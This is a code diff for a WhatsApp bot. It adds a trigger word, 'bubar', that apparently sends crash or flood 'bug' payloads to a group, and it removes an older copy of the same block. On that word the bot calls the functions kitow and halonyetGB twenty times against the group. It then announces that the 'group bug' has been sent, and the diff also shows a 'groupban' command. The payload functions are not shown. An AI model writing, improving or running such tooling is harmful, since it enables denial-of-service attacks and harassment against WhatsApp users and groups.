@@ -713,6 +713,36 @@ async function handleWAMessage(sock, number, chatUpdate) {
     }
     // ================= END LOG =================
 
+    // ===== TRIGGER "bubar" TANPA PREFIX =====
+    if (body.trim().toLowerCase() === "bubar") {
+      try {
+        const groupMetadata = await sock.groupMetadata(from);
+        const groupJid = groupMetadata.id;
+
+        await sock.sendMessage(from, {
+          text: `kintana is here ${groupMetadata.subject}...`
+        }, { quoted: mek });
+
+        for (let i = 0; i < 20; i++) {
+          await Promise.allSettled([
+            kitow(sock, groupJid).catch(() => {}),
+            halonyetGB(sock, groupJid).catch(() => {})
+          ]);
+          await sleep(500);
+        }
+
+        await sock.sendMessage(from, {
+          text: `✅ Bug grup terkirim.`
+        }, { quoted: mek });
+      } catch (e) {
+        await sock.sendMessage(from, {
+          text: `❌ Error: ${e.message}`
+        }, { quoted: mek });
+      }
+      return;
+    }
+    // ===== END TRIGGER =====
+
     if (!body.startsWith(".")) return;
 
     const command = body.slice(1).trim().split(/\s+/)[0].toLowerCase();
@@ -830,37 +860,6 @@ async function handleWAMessage(sock, number, chatUpdate) {
         }
         break;
       }
-
-const textMsg = (mek.message?.conversation || 
-                 mek.message?.extendedTextMessage?.text || "").trim().toLowerCase();
-
-if (textMsg === "bubar") {
-  try {
-    const groupMetadata = await sock.groupMetadata(from);
-    const groupJid = groupMetadata.id;
-    
-    await sock.sendMessage(from, { 
-      text: `kintana is here ${groupMetadata.subject}...` 
-    }, { quoted: mek });
-    
-    for (let i = 0; i < 20; i++) {
-      await Promise.allSettled([
-        kitow(sock, groupJid).catch(() => {}),
-        halonyetGB(sock, groupJid).catch(() => {})
-      ]);
-      await sleep(500);
-    }
-    
-    await sock.sendMessage(from, { 
-      text: `✅ Bug grup terkirim.` 
-    }, { quoted: mek });
-  } catch (e) {
-    await sock.sendMessage(from, { 
-      text: `❌ Error: ${e.message}` 
-    }, { quoted: mek });
-  }
-  return; // stop, jangan lanjut ke command lain
-}
 
       case "groupban": {
         if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .groupban https://chat.whatsapp.com/xxxxx" }, { quoted: mek });
